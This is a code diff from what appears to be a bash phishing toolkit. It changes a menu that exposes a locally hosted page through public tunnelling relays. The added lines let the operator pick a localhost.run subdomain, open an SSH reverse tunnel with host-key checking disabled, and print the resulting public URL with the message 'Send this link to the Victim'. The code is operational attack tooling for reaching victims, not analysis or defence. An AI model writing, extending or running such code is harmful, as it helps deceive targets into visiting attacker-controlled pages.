@@ -465,7 +465,7 @@ function relays(){
 	echo -e """$grey
 Choose the HTTP(S) Relay$grey
   1 - serveo.net
-  2 - ssh.localhost.run
+  2 - ssh.localhost.run$yellow choose subdomain$grey
   3 - openport
   4 x Localtunnel$yellow choose subdomain$grey
   5 - LocalXpose$yellow choose subdomain$grey
@@ -491,7 +491,12 @@ Choose the HTTP(S) Relay$grey
 	    #send_link=$(cat sendlink.txt | cut -d ' ' -f 5)
 	    #send_link=$(cat sendlink.txt | grep -o "https://root-[0-9a-z]*\.localhost.run")
 	    #echo -e "[+] Send this link to the Victim:$yellowb $send_link$grey"
-	    ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:127.0.0.1:$port ssh.localhost.run > sendlink.txt &
+	    default_subdomain=$domainRep
+	    echo -ne "[?] Choose Subdomain default($yellow$domainRep$grey)"
+	    read -p " > " subdomain
+	    subdomain="${subdomain:-${default_subdomain}}"
+	    echo -e "[+] Connection ssh.localhost.run Server..."
+	    ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:127.0.0.1:$port $subdomain@ssh.localhost.run > sendlink.txt &
 	    sleep 10
 	    send_link=$(cat sendlink.txt | grep -o "https://[0-9a-z]*\-[0-9a-z]*\.localhost.run")
 	    echo -e "[+] Send this link to the Victim:$yellowb $send_link$grey";;
